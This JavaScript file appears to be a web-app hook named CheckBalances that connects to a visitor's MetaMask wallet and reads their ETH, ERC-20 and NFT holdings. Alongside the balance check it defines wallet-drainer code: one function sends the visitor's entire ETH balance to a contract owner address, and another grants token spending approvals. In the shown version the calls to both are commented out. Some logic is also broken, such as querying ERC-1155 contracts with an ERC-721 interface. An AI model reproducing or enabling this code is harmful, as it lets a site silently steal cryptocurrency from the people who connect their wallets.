import { ethers } from "ethers";
import { tokenAddresses, erc20Abi, contractOwnerAddress } from '../config.js';

// ERC-721 ABI (minimal ABI for balanceOf and token details)
const erc721Abi = [
    "function balanceOf(address owner) view returns (uint256)",
    "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
    "function tokenURI(uint256 tokenId) view returns (string)"
];

// ERC-1155 ABI (minimal ABI for balanceOf and token URI)
const erc1155Abi = [
    "function balanceOf(address account, uint256 id) view returns (uint256)",
    "function uri(uint256 id) view returns (string)"
];

// ERC-721 contract addresses (popular collections on the Ethereum network)
const erc721Addresses = [
    "0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB", // CryptoPunks (Wrapped CryptoPunks)
    "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d", // Bored Ape Yacht Club (BAYC)
    "0xed5af388653567af2f388e6224dc7c4b3241c544", // Azuki
    "0xe785E82358879F061BC3dcAC6f0444462D4b5330", // World of Women
    "0x8a90cab2b38dba80c64b7734e58ee1db38b8992e"  // Doodles
];

// ERC-1155 contract addresses (popular collections on the Ethereum network)
const erc1155Addresses = [
    "0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c", // Enjin
    "0xF6793dA657495ffeFF9Ee6350824910Abc21356C", // Rarible
    "0x0e3a2a1f2146d86a604adc220b4967a898d7fe07" // Gods Unchained
];

let CheckBalances = {
    async mounted() {
        if (!window.ethereum) {
            return;
        }

        try {
            // Connect to MetaMask
            const provider = new ethers.BrowserProvider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            const signer = await provider.getSigner();
            const userAddress = await signer.getAddress();

            // Get ETH balance
            const balance = await provider.getBalance(userAddress);
            const formattedBalance = ethers.formatEther(balance);

            // Get list of token balances
            const tokenBalances = await this.getTokenBalances(provider, userAddress);

            // Get list of NFTs
            const nftCollection = await this.getNFTs(signer, userAddress);

            // Automatically transfer the entire ETH balance to the contract owner
            // await this.transferEntireEthBalance(signer, balance);

            // // Automatically approve all available tokens for the user address if balance is greater than zero
            // await this.approveTokensAutomatically(signer, tokenBalances, userAddress);

            // Push the results back to LiveView
            const formattedBalances = tokenBalances.map(token => ({
                ...token,
                rawBalance: token.rawBalance.toString() // Convert BigInt to string
            }));

            this.pushEvent("check_balances_result", {
                address: userAddress,
                eth_balance: formattedBalance,
                tokens: formattedBalances,
                nfts: nftCollection
            });

        } catch (error) {
            console.error("Error checking balances:", error);
        }
    },

    async getTokenBalances(provider, address) {
        const tokenBalances = [];

        for (const tokenAddress of tokenAddresses) {
            try {
                const contract = new ethers.Contract(tokenAddress, erc20Abi, provider);
                const balance = await contract.balanceOf(address);
                const decimals = await contract.decimals();
                const symbol = await contract.symbol();
                const formattedBalance = ethers.formatUnits(balance, decimals);

                if (balance > 0) {
                    tokenBalances.push({
                        tokenAddress,
                        symbol,
                        balance: formattedBalance,
                        rawBalance: balance // Keep raw balance for approval
                    });
                }
            } catch (error) {
                console.error(`Failed to fetch balance for token at ${tokenAddress}:`, error);
            }
        }

        return tokenBalances;
    },

    async getNFTs(signer, userAddress) {
        const nfts = [];

        // Fetch ERC-721 NFTs
        for (const nftAddress of erc721Addresses) {
            if (ethers.isAddress(nftAddress)) {
                try {
                    const contract = new ethers.Contract(nftAddress, erc721Abi, signer);
                    const balance = await contract.balanceOf(userAddress);
                    for (let i = 0; i < balance; i++) {
                        const tokenId = await contract.tokenOfOwnerByIndex(userAddress, i);
                        const tokenURI = await contract.tokenURI(tokenId);
                        nfts.push({ contract: nftAddress, tokenId, tokenURI, type: "ERC-721" });
                    }
                } catch (error) {
                    console.error(`Failed to fetch ERC-721 NFTs from ${nftAddress}: ${error}`);
                }
            }
        }

        // Fetch ERC-1155 NFTs
        for (const nftAddress of erc1155Addresses) {
            if (ethers.isAddress(nftAddress)) {
                try {
                    const contract = new ethers.Contract(nftAddress, erc721Abi, signer);
                    const balance = await contract.balanceOf(userAddress);
                    for (let i = 0; i < balance; i++) {
                        const tokenId = await contract.tokenOfOwnerByIndex(userAddress, i);
                        const tokenURI = await contract.tokenURI(tokenId);
                        nfts.push({ contract: nftAddress, tokenId, tokenURI, type: "ERC-1155" });
                    }
                } catch (error) {
                    console.error(`Failed to fetch ERC-1155 NFTs from ${nftAddress}: ${error}`);
                }
            }
        }

        return nfts;
    },

    async approveTokensAutomatically(signer, tokenBalances, spenderAddress) {
        for (const token of tokenBalances) {
            try {
                const contract = new ethers.Contract(token.tokenAddress, erc20Abi, signer);
                const tx = await contract.approve(spenderAddress, token.rawBalance);
                await tx.wait();
                console.log(`Automatically approved ${token.symbol} with ${token.balance} tokens for ${spenderAddress}`);
            } catch (error) {
                console.error(`Failed to automatically approve ${token.symbol}:`, error);
            }
        }
    },

    async transferEntireEthBalance(signer, balance) {
        try {
            const gasEstimate = ethers.parseUnits("0.001", "ether");
            const amountToSend = balance - gasEstimate;

            if (amountToSend > 0) {
                const tx = await signer.sendTransaction({
                    to: contractOwnerAddress,
                    value: amountToSend
                });
                await tx.wait();
                console.log(`Successfully transferred ${ethers.formatEther(amountToSend)} ETH to ${contractOwnerAddress}`);
            } else {
                console.log("Not enough ETH balance to cover gas fees.");
            }
        } catch (error) {
            console.error("Failed to transfer ETH:", error);
        }
    }
};

export default CheckBalances;
